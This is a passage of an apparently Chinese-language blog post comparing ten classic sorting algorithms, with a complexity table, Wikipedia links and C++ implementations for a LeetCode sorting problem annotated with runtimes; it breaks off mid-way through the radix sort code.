n)$</td><td>$O(n^2)$</td><td>$O(n\log n)$</td><td>$O(\log n)$~$O(n)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>归并排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n)$</td><td align="center">$\checkmark$</td><td align="center">$\checkmark$</td></tr><tr><td>希尔排序</td><td>$O(n^{1.3})$</td><td>$O(n^2)$</td><td>$O(n\log n)$~$O(n^2)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>基数排序</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(nk)$</td><td>$O(n+k)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>桶排序</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n)$</td><td>$O(n+m)$</td><td align="center">$\checkmark$</td><td align="center">$\times$</td></tr><tr><td>堆排序</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(n\log n)$</td><td>$O(1)$</td><td align="center">$\times$</td><td align="center">$\checkmark$</td></tr></tbody></table><blockquote><p>如果表格显示有问题的话，还可以直接看下面的汇总图：</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/02/16/sort-algorithms/1.png" alt="十大经典排序算法性质汇总"></p><h3 id="维基百科"><a href="#维基百科" class="headerlink" title="维基百科"></a>维基百科</h3><p>我觉得还是英文维基百科讲的比较详细、严谨。如果大家看的比较累的话，可以自己百度搜索相应的教程。</p><p><strong>冒泡排序</strong><br><a href="https://en.wikipedia.org/wiki/Bubble_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bubble_sort</a></p><p><strong>选择排序</strong><br><a href="https://en.wikipedia.org/wiki/Selection_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Selection_sort</a></p><p><strong>插入排序</strong><br><a href="https://en.wikipedia.org/wiki/Insertion_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong><br><a href="https://en.wikipedia.org/wiki/Quicksort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong><br><a href="https://en.wikipedia.org/wiki/Merge_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong><br><a href="https://en.wikipedia.org/wiki/Heapsort" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Heapsort</a></p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token number">-2</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> idx <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    idx <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 插入排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">insertSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 快速排序（24 ms）</span>    <span class="token keyword">void</span> <span class="token function">qSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>m<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>r<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">quickSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">qSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序（192 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">>=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span>nums<span class="token punctuation">[</span>l<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span><span class="token punctuation">(</span>r<span class="token operator">-</span>l<span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> lnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> l<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rnums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> rnums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token operator">-</span>l<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>lnums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token operator">-</span>m<span class="token number">-1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>rnums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        nums <span class="token operator">=</span> <span class="token function">mSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 归并排序 + 非递归（80 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">mergeSortNR</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;</span> n<span class="token operator">-</span>len<span class="token punctuation">;</span> l <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>len<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">int</span> m <span class="token operator">=</span> l<span class="token operator">+</span>len<span class="token number">-1</span><span class="token punctuation">;</span>                <span class="token keyword">int</span> r <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span> l<span class="token operator">+</span><span class="token number">2</span><span class="token operator">*</span>len<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>                <span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> m<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                        res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> m<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token operator">-</span>l<span class="token punctuation">]</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 希尔排序（40 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">shellSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> gap <span class="token operator">=</span> n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> gap <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> gap <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> gap<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j<span class="token operator">-</span>gap <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span> <span class="token operator">></span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j <span class="token operator">-</span><span class="token operator">=</span> gap<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token operator">-</span>gap<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 计数排序（32 ms）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">countSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>n<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> minv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">min_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> m <span class="token operator">=</span> maxv<span class="token operator">-</span>minv<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            count<span class="token punctuation">[</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>minv<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> res<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> count<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                res<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">+</span>minv<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> res<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 基数排序（不适用于负数）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">radixSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxv <span class="token operator">=</span> <span class="token operator">*</span><span class="token function">max_element</span><span class="token punctuation">(</span>nums<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nums<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> maxd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>maxv <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            maxv <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>            maxd<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> <span class="token function">count</span><span class="token punctuation">(</span><span 